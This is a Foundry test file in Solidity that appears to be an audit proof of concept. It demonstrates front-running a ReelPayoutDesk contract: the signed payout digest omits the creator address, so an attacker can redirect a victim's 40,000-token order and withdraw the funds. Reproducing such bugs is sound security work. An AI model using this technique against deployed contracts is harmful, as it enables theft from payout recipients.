// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/ReelPayoutDesk.sol";
import "../src/PayoutOrderLib.sol";

contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract CreatorFrontRunTest is Test {
    uint256 constant RESERVE = 250_000 ether;
    uint256 constant AUTHORITY_KEY = 0xA11CE5;

    ReelPayoutDesk desk;
    MockToken token;
    address authority;
    address owner = makeAddr("owner");
    address funder = makeAddr("funder");
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    function setUp() public {
        authority = vm.addr(AUTHORITY_KEY);
        token = new MockToken();
        desk = new ReelPayoutDesk(owner, authority, address(token));

        token.mint(funder, RESERVE);
        vm.startPrank(funder);
        token.approve(address(desk), RESERVE);
        desk.fundReserve(RESERVE);
        vm.stopPrank();
    }

    function test_creatorFrontRun() public {
        // the authority issues order #7 to the victim: 40,000 tokens
        PayoutOrder memory order = PayoutOrder({
            orderId: 7,
            creator: victim,
            amount: 40_000 ether,
            deadline: uint64(block.timestamp + 3 days)
        });
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(AUTHORITY_KEY, desk.getOrderDigest(order));
        bytes memory signature = abi.encodePacked(r, s, v);

        // the attacker copies the pending order and changes only the creator field
        PayoutOrder memory attackerOrder = PayoutOrder({
            orderId: order.orderId,
            creator: attacker,
            amount: order.amount,
            deadline: order.deadline
        });
        assertEq(desk.getOrderDigest(attackerOrder), desk.getOrderDigest(order), "same digest");

        // attacker submits first, then withdraws
        vm.prank(attacker);
        desk.processOrder(attackerOrder, signature);
        vm.prank(attacker);
        desk.withdraw(40_000 ether);

        // the victim's own transaction now reverts
        vm.prank(victim);
        vm.expectRevert(ReelPayoutDesk.OrderAlreadyProcessed.selector);
        desk.processOrder(order, signature);

        console2.log("attacker token balance:", token.balanceOf(attacker));
        console2.log("victim token balance  :", token.balanceOf(victim));
        console2.log("victim desk balance   :", desk.balanceOf(victim));
        console2.log("desk reserve          :", token.balanceOf(address(desk)));

        assertEq(token.balanceOf(attacker), 40_000 ether, "attacker received the payout");
        assertEq(token.balanceOf(victim), 0, "victim got nothing");
        assertEq(desk.balanceOf(victim), 0, "nothing allocated to the victim");
        assertEq(token.balanceOf(address(desk)), RESERVE - 40_000 ether);
    }
}
